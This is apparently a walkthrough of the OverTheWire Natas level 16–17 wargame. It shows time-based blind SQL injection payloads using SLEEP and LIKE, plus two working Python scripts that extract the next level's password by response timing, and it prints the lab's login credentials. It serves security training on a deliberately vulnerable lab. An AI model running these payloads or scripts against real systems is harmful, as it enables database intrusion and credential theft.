# Level 16 - Level 17

```
Username: natas17
Password: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
URL:      http://natas17.natas.labs.overthewire.org
```

## Overview

Again, we got an input field with a link to the source code.

<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

***

## Source Code Analysis

Form taking a look at the source code we can see that the query is vulnerable to SQL injection.

<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

But all the errors that are to be thrown due to the SQL injection payloads are commented out.

<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

So we can't perform error based or boolean based SQL Injection.

***

## Testing Time Based SQL Injection

So let's opt out for Time Based injection. Let's try the following payload, since we know that there is going to be a user named `natas18` in the table ( from the patterns followed in previous  levels ):

```sql
natas18" AND sleep(5) #
```

You can see that the browser responded with no errors after 5 seconds.

<figure><img src="../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

Now, we have confirmed that there is user named `natas18`. Now we have to retrieve the password for  that particular user. To do that we are going to brute force with alphanumerice letters, trying to match the password string, like we did in the last level using regexp, but this time we are going to make use of the SQL operator LIKE.

Let's try the following payload:

```sql
natas18" AND BINARY password LIKE "a%" AND SLEEP(5) #
```

It responded immediately, which means the password doesn't start with the letter a. Let's find the first character by using a simple python script, in which we are going set the value of SLEEP to be 1 and we will filter the responses based on the response time, i.e., if the response time is greater than 1, then that is the first character of the password.

{% code lineNumbers="true" %}
```python
import requests
from requests.auth import HTTPBasicAuth
from string import *
from time import *

characters = ascii_letters + digits

password = ""

session = requests.Session()

for character in characters:
    start_time = time()

    response = session.post(
        "http://natas17.natas.labs.overthewire.org/index.php",
        auth=HTTPBasicAuth(username="natas17",
                            password="XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"),
        data={"username": 'natas18" AND BINARY password LIKE "' + character + '%" AND SLEEP(1) # '}
    )

    end_time = time()
    difference = end_time - start_time

    if difference > 1:
        password += character
        break

print("Password: ", password)
```
{% endcode %}

The above script responded with the following output, from which we have found the first letter of the password.&#x20;

<figure><img src="../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

***

## Getting the Entire Password

Now its time to fetch the entire password. The following python script will fetch the entire password based on the response time of the requests.

{% code lineNumbers="true" %}
```python
import requests
from requests.auth import HTTPBasicAuth
from string import *
from time import *

characters = ascii_letters + digits

password = ""

session = requests.Session()

while len(password) < 32:
    for character in characters:
        start_time = time()

        response = session.post(
            "http://natas17.natas.labs.overthewire.org/index.php",
            auth=HTTPBasicAuth(username="natas17",
                               password="XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"),
            data={"username": 'natas18" AND BINARY password LIKE "' +
                  "".join(password) + character + '%" AND SLEEP(1) # '}
        )

        end_time = time()
        difference = end_time - start_time

        if difference > 1:
            password += character
            break
    print("Password: ", password)
```
{% endcode %}

The password for the next level has been obtained from the output of the above script.

<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
